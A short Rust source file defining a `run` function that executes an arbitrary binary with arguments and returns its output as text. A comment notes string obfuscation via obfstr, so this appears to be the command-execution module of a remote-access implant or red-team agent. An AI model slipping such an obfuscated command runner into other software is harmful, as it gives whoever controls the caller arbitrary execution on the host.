use fmtools::format; // using obfstr to obfuscate
use std::process::Command;
use std::string::String;

pub(crate) fn run(args: &[String]) -> String {
    let (command, args) = match args.len() {
        0 => return format!("Invalid number of arguments received. Usage: 'run [binary] <optional: arguments>'."),
        1 => (args[0].clone(), Vec::new()),
        _ => (args[0].clone(), args[1..].to_vec()),
    };

    match Command::new(command)
        .args(args)
        .output() {
        Ok(output) => {
            match output.stdout.len() {
                0 => format!("Command executed successfully."),
                _ => String::from_utf8_lossy(&output.stdout).to_string()
            }
        },
        Err(e) => format!("Failed to execute command: "{e}),
    }
}